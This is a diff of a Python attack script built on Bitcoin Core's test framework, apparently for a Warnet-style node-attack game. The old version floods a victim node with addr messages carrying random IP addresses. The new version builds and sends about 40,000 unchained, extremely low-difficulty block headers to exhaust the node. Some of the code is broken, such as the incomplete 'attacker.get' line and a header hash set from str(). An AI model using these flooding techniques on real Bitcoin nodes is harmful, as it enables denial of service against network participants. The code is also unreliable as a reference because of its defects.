@@ -7,12 +7,11 @@ from commander import Commander
 # The entire Bitcoin Core test_framework directory is available as a library
 from test_framework.messages import MSG_TX, CInv, hash256, msg_inv
 from test_framework.p2p import MAGIC_BYTES, P2PInterface
-from test_framework.messages import msg_addr, CAddress
+from test_framework.messages import msg_addr, CAddress, msg_headers, CBlockHeader
 import random
 import time
-import concurrent.futures
-import socket
-random.seed(int(time.time()))
+from time import sleep
+
 
 def get_signet_network_magic_from_node(node):
     template = node.getblocktemplate({"rules": ["segwit", "signet"]})
@@ -55,7 +54,8 @@ class UnknownMessage(Commander):
         # We know this one is vulnderable to an unknown messages based on it's subver
         # Use either reconnaisance or ForkObserver UI to find vulnerable nodes
         # Change this to your teams colour if running in the battleground
-        victim = "tank-0040-coffee.default.svc"
+        # victim = "tank-0043-coffee.default.svc"
+        victim = "localhost"
 
         # regtest or signet
         chain = self.nodes[0].chain
@@ -78,36 +78,47 @@ class UnknownMessage(Commander):
         )()
         attacker.wait_until(lambda: attacker.is_connected, check_connected=False)
 
-        for i in range(4294967):
-            # for i in range(4294967.296):
-            for i in range(500):
-                random_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
-                random_port = random.randint(1024, 65535)  # Random high port
+        print(f"[*] Sending {100000} low-difficulty headers...")
+        headers_msg = msg_headers()
+        previous_hash = b"\x00" * 32  # Start from an empty hash
 
-                # Create an addr message
-                addr = CAddress()
-                addr.time = int(time.time())
-                addr.nServices = 1  # NODE_NETWORK service flag
-                addr.ip = random_ip
-                addr.port = 38333
+        getblocks_message = attacker.get
 
-                addr_msg = msg_addr()
-                addr_msg.addrs.append(addr)
+        for i in range(40000):
+            header = CBlockHeader()
+            header.nVersion = 1
+            header.hashPrevBlock = str(previous_hash)  # Chain it to previous header
+            header.nTime = int(time.time())  # Fake timestamp
+            header.nBits = 0x207FFFFF  # **Extremely low difficulty**
+            header.nNonce = 0
+            print("creating header", i)
+            headers_msg.headers.append(header)
+            # previous_hash = hash256(header)
 
-                addr.time = int(time.time())
-                addr.nServices = 1  # NODE_NETWORK service flag
-                addr.ip = random_ip
-                addr.port = 18444
+            # previous_hash = 0x5f0b403001c75b6e0cd5c2f421253a4616844aed2069e24506aac48aae6b537c
 
-                addr_msg.addrs.append(addr)
-
-                # Send the message
-                # attacker.send_message(addr_msg)
-            attacker.send_message(addr_msg)
-            if i%10000 == 0:
-                print(f"Sent addr message: {random_ip}:{random_port}. iter {i}")
-
-        # time.sleep(0.1)  # Adjust sleep time to control spam rate
+            # if len(headers_msg.headers) >= 2000:  # Max batch size
+                # try:
+        print(f"Sending {i}")
+        attacker.send_and_ping(headers_msg)
+        # headers_msg = msg_headers()
+            # attacker.peer_disconnect()
+            # attacker.peer_connect(
+                # dstaddr=dstaddr, dstport=dstport, net="signet", timeout_factor=1
+            # )()
+            # attacker.wait_until(lambda: attacker.is_connected, check_connected=False)                    # sleep(10)
+                # except Exception as e:
+                    # print("Connection error:", e)
+                    # while not attacker.is_connected:
+                        # try:
+                            # attacker.peer_connect(
+                                # dstaddr=dstaddr, dstport=dstport, net="signet", timeout_factor=1
+                            # )()
+                            # sleep(1)
+                            # attacker.wait_until(lambda: attacker.is_connected, check_connected=False)
+                        # except Exception:
+                            # pass
+        print("[+] Headers sent successfully!")
 
 def main():
     UnknownMessage().main()
